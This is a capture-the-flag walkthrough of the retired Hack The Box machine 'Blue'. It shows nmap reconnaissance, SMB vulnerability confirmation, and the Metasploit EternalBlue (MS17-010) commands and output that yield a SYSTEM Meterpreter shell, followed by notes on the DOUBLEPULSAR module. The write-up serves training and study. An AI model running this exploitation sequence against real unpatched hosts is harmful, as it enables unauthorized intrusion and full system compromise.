# Blue — Hack The Box

| | |
|---|---|
| **Platform** | Hack The Box |
| **OS** | 🪟 Windows 7 Professional (7601, SP1) |
| **Difficulty** | 🟢 Easy |
| **Owned** | 17/09/2026 |
| **Author** | Maksym S |

> ⚠️ Retired machine. Flags are redacted (`<redacted>`) in line with the HTB Terms of Service.

---

## 📌 Summary

**Blue** is the canonical **MS17-010 / EternalBlue** box: a default-configured Windows 7 host
exposing SMB (139/445) with SMBv1 enabled and unpatched. A single Metasploit exploit run lands a
SYSTEM-level Meterpreter session with no separate privilege-escalation step required.

**Attack path:** `SMBv1 (dialect NT LM 0.12) → MS17-010 / EternalBlue (CVE-2017-0143) → SYSTEM`

---

## 🔍 1. Reconnaissance

### Port scan

```
PORT      STATE SERVICE      REASON
135/tcp   open  msrpc        syn-ack ttl 127
139/tcp   open  netbios-ssn  syn-ack ttl 127
445/tcp   open  microsoft-ds syn-ack ttl 127
49152/tcp open  unknown      syn-ack ttl 127
49153/tcp open  unknown      syn-ack ttl 127
49154/tcp open  unknown      syn-ack ttl 127
49155/tcp open  unknown      syn-ack ttl 127
49156/tcp open  unknown      syn-ack ttl 127
49157/tcp open  unknown      syn-ack ttl 127
```

### Service/version scan

```
PORT      STATE SERVICE      VERSION
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
49152-49157/tcp open msrpc   Microsoft Windows RPC

Host script results:
| smb-os-discovery:
|   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)
|   Computer name: haris-PC
|   NetBIOS computer name: HARIS-PC\x00
|   Workgroup: WORKGROUP\x00
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
```

### UDP

`udpx` swept the host: **0 UDP ports** found open.

---

## 🧭 2. Enumeration

### SMB shares (guest session)

```
sudo nmap -Pn -p139,445 --script=smb-enum-* 10.129.71.56

Host script results:
| smb-enum-shares:
|   account_used: guest
|   \\10.129.71.56\ADMIN$:      Type: STYPE_DISKTREE_HIDDEN   Anonymous access: <none>
|   \\10.129.71.56\C$:          Type: STYPE_DISKTREE_HIDDEN   Anonymous access: <none>
|   \\10.129.71.56\IPC$:        Type: STYPE_IPC_HIDDEN        Anonymous access: READ   Current user access: READ/WRITE
|   \\10.129.71.56\Share:       Type: STYPE_DISKTREE                                    Current user access: READ
|_  \\10.129.71.56\Users:       Type: STYPE_DISKTREE                                    Current user access: READ
```

### Confirming the SMB dialect

```
sudo nmap -Pn -p445 --script=smb-protocols 10.129.71.56

Host script results:
| smb-protocols:
|   dialects:
|     NT LM 0.12 (SMBv1) [dangerous, but default]
|     2.0.2
|_    2.1
```

SMBv1 is enabled alongside SMBv2 — the immediate signal to run `smb-vuln*`.

### Vulnerability scan

```
sudo nmap -Pn --script=smb-vuln* -p 445 10.129.71.56

Host script results:
| smb-vuln-ms17-010:
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|     Disclosure date: 2017-03-14
|     References:
|       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
|       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
|_smb-vuln-ms10-061: NT_STATUS_OBJECT_NAME_NOT_FOUND
|_smb-vuln-ms10-054: false
```

Confirmed vulnerable to MS17-010 → EternalBlue-family exploit needed.

---

## 🎯 3. Foothold / Exploitation

```
msf > search ms17-010
   0   exploit/windows/smb/ms17_010_eternalblue       2017-03-14  average  Yes  MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
   10  exploit/windows/smb/ms17_010_psexec            2017-03-14  normal   Yes  MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
   24  auxiliary/scanner/smb/smb_ms17_010              .          normal   Yes  MS17-010 SMB RCE Detection
   27  exploit/windows/smb/smb_doublepulsar_rce       2017-04-14  great    Yes  SMB DOUBLEPULSAR Remote Code Execution

msf > use exploit/windows/smb/ms17_010_eternalblue
msf exploit(windows/smb/ms17_010_eternalblue) > set LHOST 10.10.15.121
msf exploit(windows/smb/ms17_010_eternalblue) > set RHOST 10.129.71.56
msf exploit(windows/smb/ms17_010_eternalblue) > run

[+] 10.129.71.56:445 - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit)
[+] 10.129.71.56:445 - Target arch selected valid for arch indicated by DCE/RPC reply
[+] 10.129.71.56:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
[*] Sending stage (255676 bytes) to 10.129.71.56
[*] Meterpreter session 1 opened (10.10.15.121:4444 -> 10.129.71.56:49175) at 2026-09-17 11:08:11 -0400
[+] 10.129.71.56:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=

meterpreter > sysinfo
Computer        : HARIS-PC
OS              : Windows 7 (6.1 Build 7601, Service Pack 1).
Architecture    : x64
Domain          : WORKGROUP
Logged On Users : 3

meterpreter > shell
C:\Windows\system32>whoami
nt authority\system
```

No separate privilege-escalation step was needed — EternalBlue's kernel pool-corruption RCE lands
directly as `NT AUTHORITY\SYSTEM`.

---

## 🚩 Proof

```
C:\Windows\system32>dir C:\Users\
 Directory of C:\Users
    Administrator
    haris
    Public

C:\Windows\system32>type C:\Users\Administrator\Desktop\root.txt
<redacted>

C:\Windows\system32>type C:\Users\haris\Desktop\user.txt
<redacted>
```

```
user.txt (haris):          <redacted>
root.txt (Administrator):  <redacted>
```

---

## 🔬 Research notes

Two questions were left open in the working notes after this box; researched here in a
gather-then-verify pass (see `.claude/skills/vault-research/references/` for the method), keeping
only what trusted sources (Rapid7's own module documentation, as the exploit's maintainer)
confirm.

### What is `exploit/windows/smb/smb_doublepulsar_rce`, and why didn't it work here despite its "great" rank?

`smb_doublepulsar_rce` is **not an initial-access exploit** — it's a payload-execution module
that talks to an **existing DOUBLEPULSAR implant** already resident on the target (DOUBLEPULSAR
being the SMB implant the Equation Group/NSA tooling plants, historically deployed via
EternalBlue). It pings for the implant, and if found, injects a Meterpreter payload into a
userland process (`spoolsv.exe` by default) or can neutralize/remove the implant.

Its "great" rank reflects **reliability of the payload-execution technique once an implant is
already present** — it doesn't say anything about being a general-purpose initial foothold. On a
freshly built HTB Blue instance, nothing has planted DOUBLEPULSAR yet (the box hasn't already been
exploited by an EternalBlue attacker), so the module has nothing to hook and fails — commonly with
a "DOUBLEPULSAR not detected or disabled" check result. That's consistent with what actually
worked here: `ms17_010_eternalblue`, which performs the initial kernel-memory-corruption exploit
itself rather than assuming a pre-existing implant.

For a deeper standalone dive into what DOUBLEPULSAR is and where to find its code/analysis, see
[`Learning/doublepulsar-implant.md`](../../Learning/doublepulsar-implant.md).

**Sources:**
- [Rapid7 module reference — SMB DOUBLEPULSAR Remote Code Execution](https://www.rapid7.com/db/modules/exploit/windows/smb/smb_doublepulsar_rce/)
- [rapid7/metasploit-framework — module documentation](https://github.com/rapid7/metasploit-framework/blob/master/documentation/modules/exploit/windows/smb/smb_doublepulsar_rce.md)

### Where to find the exploit code

The Metasploit module source (Ruby) is maintained in the open-source `rapid7/metasploit-framework`
repository:

- [`ms17_010_eternalblue.rb`](https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/windows/smb/ms17_010_eternalblue.rb) — the module actually used on this box.
- [`smb_doublepulsar_rce.rb`](https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/windows/smb/smb_doublepulsar_rce.rb) — the DOUBLEPULSAR module discussed above.

Per the Rapid7 team's own writeup, the EternalBlue module is a port of the leaked Equation Group
FuzzBunch exploit, contributed to Metasploit by researchers `zerosum0x0` and `JennaMagius`.

**Sources:**
- [Rapid7 Blog — EternalBlue: Metasploit Module for MS17-010](https://www.rapid7.com/blog/post/2017/05/20/metasploit-the-power-of-the-community-and-eternalblue/)

---

## 🧠 Lessons Learned

- **What worked:** `ms17_010_eternalblue` directly, no chaining required — a clean single-exploit
  SYSTEM box.
- **Rabbit holes:** none on the exploitation path itself; worth remembering that "great" rank in
  `search` output doesn't imply "works standalone" — check what a module actually assumes about
  target state before reaching for it.
- **OSCP takeaway:** always confirm the SMB dialect (`smb-protocols`) before running `smb-vuln*` —
  SMBv1 being enabled is the leading indicator worth chasing on any Windows box with 445 open.

---

## 🔗 References

- [CVE-2017-0143 — MS17-010 SMBv1 RCE](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143)
- [MS17-010 Security Bulletin](https://technet.microsoft.com/en-us/library/security/ms17-010.aspx)
- [Customer Guidance for WannaCrypt Attacks](https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/)
- [Rapid7 — `ms17_010_eternalblue` module docs](https://github.com/rapid7/metasploit-framework/blob/master/documentation/modules/exploit/windows/smb/ms17_010_eternalblue.md)
- [Rapid7 — `smb_doublepulsar_rce` module docs](https://github.com/rapid7/metasploit-framework/blob/master/documentation/modules/exploit/windows/smb/smb_doublepulsar_rce.md)
